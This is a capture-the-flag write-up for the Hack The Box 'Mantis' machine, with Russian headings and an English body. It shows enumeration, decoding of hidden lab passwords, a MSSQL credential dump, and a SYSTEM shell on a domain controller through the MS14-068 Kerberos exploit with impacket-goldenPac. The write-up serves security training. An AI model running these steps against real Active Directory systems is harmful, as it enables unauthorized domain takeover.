---
title: "[HTB] Mantis"
permalink: /writeups/htb/mantis/
excerpt: "Краткий разбор машины Mantis с Hack The Box."
tags:
  - hackthebox
  - htb
  - activedirectory
  - pentest
  - writeup
  - sql
  - cve
  - kerberos
---

---

{% include toc icon="cog" title="Mantis Solution" %}

The [Mantis](https://app.hackthebox.com/machines/Mantis) machine has been created by [lkys37en](https://app.hackthebox.com/users/709). This is an **hard** Windows Machine with a strong focus on Active Directory exploitation. This box was interesting as we had to play with SQL and old exploit.
{: .text-justify}

If you didn't solve this challenge and just look for answers, first you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints for attack paths when dealing with an Active Directory.

![image-center](/images/htb/htb_mantis_infocard.png){: .align-center}

**Заметка:** Все действия против целевой машины выполнялись со стандартной системой *Kali Linux*. Скачать Kali можно с официального сайта [здесь](https://www.kali.org/).
{: .notice--info}

# Разведка

In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 

## Сканирование Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/) in order to reveal some of the TCP ports open on the machine.

**Заметка:** После запуска HTB-машины всегда подожди несколько минут, чтобы убедиться, что все сервисы поднялись корректно. Если просканировать машину сразу, можно пропустить порты, которые должны быть открыты.
{: .notice--info}

```bash
$ nmap -Pn -sV 10.129.100.147          
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-14 06:56 EST
Nmap scan report for 10.129.100.147
Host is up (0.019s latency).
Not shown: 981 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-02-14 11:56:48Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
8080/tcp  open  http         Microsoft IIS httpd 7.5
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.09 seconds
```

**Помни:** По умолчанию **Nmap** сканирует 1000 самых распространенных TCP-портов на целевых хостах. Если нужно сканировать больше портов или изменить поведение по умолчанию, обязательно прочитай [документацию](https://nmap.org/docs.html).
{: .notice--warning}

Here we have a few interesting ports including an **HTTP** server on TCP/8080. The host is also the domain controller for **htb.local**.

## HTTP-разведка

The Web server seems to be running [Orchard](https://orchardcore.net) an ASP.NET CMS. After looking around we didn't find any specific vulnerability on the CMS. Using [gobuster](https://github.com/OJ/gobuster), a brute-force tool for Web services, and a standard wordlist we started a directory enumeration.

```bash
$ gobuster dir -u http://10.129.100.147:8080 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.100.147:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/14 06:59:43 Starting gobuster in directory enumeration mode
===============================================================
/_archive             (Status: 200) [Size: 2867]
/ADMIN                (Status: 302) [Size: 163] [--> /Users/Account/AccessDenied?ReturnUrl=%2FADMIN]
/admin                (Status: 302) [Size: 163] [--> /Users/Account/AccessDenied?ReturnUrl=%2Fadmin]
/Admin                (Status: 302) [Size: 163] [--> /Users/Account/AccessDenied?ReturnUrl=%2FAdmin]
/archive              (Status: 200) [Size: 2866]                                                    
/Archive              (Status: 200) [Size: 2866]                                                    
/blogs                (Status: 200) [Size: 2913]                                                    
/tags                 (Status: 200) [Size: 2453]                                                    
                                                                                                    
===============================================================
2022/02/14 07:01:43 Finished
===============================================================
```

Among the results, we found an administration login page.

![image-center](/images/htb/htb_mantis_login.png){: .align-center}

However, after a few tries, no password was found for the admin user.

## More Nmap

After looking around for a while, we gave another try with Nmap. Again, by default, Nmap only scans the 1000 most common ports, let's try to scan all the ports TCP from 1 to 10000.

```bash
$ nmap -Pn -sV -p1-10000 10.129.100.147
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-14 06:55 EST
Nmap scan report for 10.129.100.147
Host is up (0.017s latency).
Not shown: 9984 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-02-14 11:55:31Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1337/tcp open  http         Microsoft IIS httpd 7.5
1433/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5722/tcp open  msrpc        Microsoft Windows RPC
8080/tcp open  http         Microsoft IIS httpd 7.5
9389/tcp open  mc-nmf       .NET Message Framing
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.11 seconds
```

Nice, we found another Web server running on **TCP/1337**. Now, let's run `gobuster` again.

```bash
$ gobuster dir -u http://10.129.100.147:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.100.147:1337
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/14 07:05:21 Starting gobuster in directory enumeration mode
===============================================================
/orchard              (Status: 500) [Size: 3026]
/secure_notes         (Status: 301) [Size: 162] [--> http://10.129.100.147:1337/secure_notes/]
```

One folder seems to be interesting: **secure_notes**.

![image-center](/images/htb/htb_mantis_folder.png){: .align-center}

Moreover, one of the file name seems to have some kind of Base64 encoded value in it, but we will get back to that later.

# Первичный доступ

In a real-world scenario, adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives or other services.

## Decoding Passwords

By looking at the end of the discovered file, we found an interesting value.

![image-center](/images/htb/htb_mantis_notes.png){: .align-center}

Apparently, it is the admin password of Orchard CMS, encoded in what appears to be binary. Let's see if we can decoded with Python.

```bash
$ python
Python 3.9.10 (main, Jan 16 2022, 17:12:18) 
[GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import binascii
>>> pasw = int("010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001", 2)
>>> binascii.unhexlify("%x" % pasw)
b'@dm!n_P@ssW0rd!'
```

Great, back to the administration page of Orchard.

![image-center](/images/htb/htb_mantis_admin.png){: .align-center}

We can login, but nothing really interesting here. The note file also said that the **sa** account of the database is embedded in the filename. Let's decode it.

```bash
$ echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d                                                                     
6d2424716c5f53405f504073735730726421
```

It looks like hexadecimal value. Maybe we can decode it.

```bash
$ echo 6d2424716c5f53405f504073735730726421 | xxd -r -p 
m$$ql_S@_P@ssW0rd!
```

Now, maybe we can access to the MSSQL server using these credentials and [impacket-mssqlclient](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py).

```bash
$ impacket-mssqlclient 'sa@10.129.100.147'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[-] ERROR(MANTIS\SQLEXPRESS): Line 1: Login failed for user 'sa'.
```

Fail... Let's see if we can use the **admin** credentials to login.

```bash
impacket-mssqlclient 'admin@10.129.100.147'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[-] ERROR(MANTIS\SQLEXPRESS): Line 1: Login failed for user 'admin'.
```

Still no luck. Maybe we can use **admin** and the password of **sa**.

```bash
$ impacket-mssqlclient 'admin@10.129.100.147'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands

SQL>
```

Finally! Let's explore the database to see if we have some interesting things on it.

## MSSQL Access

We started by listing the databases.

```bash
SQL> SELECT name FROM master.dbo.sysdatabases;
name                                                                                                                               
--------------------------------------------------
master                                                                                                                             
tempdb                                                                                                                             
model                                                                                                                              
msdb                                                                                                                               
orcharddb 
```

Let's take a look at the **orcharddb** database.

```bash
SQL> USE orcharddb;
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: orcharddb
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'orcharddb'.

SQL> SELECT table_name FROM information_schema.tables;
table_name                                                                                                                         

--------------------------------------------------------

...[snip]...                                                                       

blog_Orchard_Users_UserPartRecord 

...[snip]...

```

We found a bunch of tables, but **blog_Orchard_Users_UserPartRecord** seems to be promising.

```bash
SQL> SELECT Username, Password FROM blog_Orchard_Users_UserPartRecord;
Username          Password   
--------          ----------------------------------------------------  

admin             AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2A==                                      
James             J@m3s_P@ssW0rd!
```

We have a cleartext password for **james**, maybe this user can login on the remote machine.

```bash
$ crackmapexec smb 10.129.100.147 -u james -p 'J@m3s_P@ssW0rd!' -d htb.local              
SMB         10.129.100.147   445    MANTIS           [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.100.147   445    MANTIS           [+] htb.local\james:J@m3s_P@ssW0rd!
```

# Повышение привилегий

Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.

## MS14-068

The [MS14-068](https://www.trustedsec.com/blog/ms14-068-full-compromise-step-step/) exploit targets Kerberos and can be used to forge Kerberos tickets using domain user permissions. Lucky for us, [impacket-goldenPac](https://github.com/SecureAuthCorp/impacket/blob/master/examples/goldenPac.py) can be used to automatically exploit the vulnerability.

However, it requieres to use the domain FQDN so let's add the following line to **/etc/hosts**.
```bash
10.129.100.147 mantis htb.local mantis.htb.local
```

Now, we can use `impacket-goldenPac` to get a **SYSTEM** shell and grab our **first** and **second** flags.

```bash
$ impacket-goldenPac 'htb.local/james:J@m3s_P@ssW0rd!@mantis'                                
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller mantis.htb.local
[*] mantis.htb.local found vulnerable!
[*] Requesting shares on mantis.....
[*] Found writable share ADMIN$
[*] Uploading file HboOvwAY.exe
[*] Opening SVCManager on mantis.....
[*] Creating service gLYd on mantis.....
[*] Starting service gLYd.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>dir c:\users\james\desktop
 Volume in drive C has no label.
 Volume Serial Number is 1A7A-6541

 Directory of c:\users\james\desktop

09/01/2017  02:10 PM    <DIR>          .
09/01/2017  02:10 PM    <DIR>          ..
09/01/2017  10:19 AM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   4,946,022,400 bytes free

C:\Windows\system32>dir c:\users\administrator\desktop
 Volume in drive C has no label.
 Volume Serial Number is 1A7A-6541

 Directory of c:\users\administrator\desktop

02/08/2021  01:44 PM    <DIR>          .
02/08/2021  01:44 PM    <DIR>          ..
09/01/2017  10:16 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   4,946,079,744 bytes free
```


Awesome! I hope you enjoyed it, I know I did :)
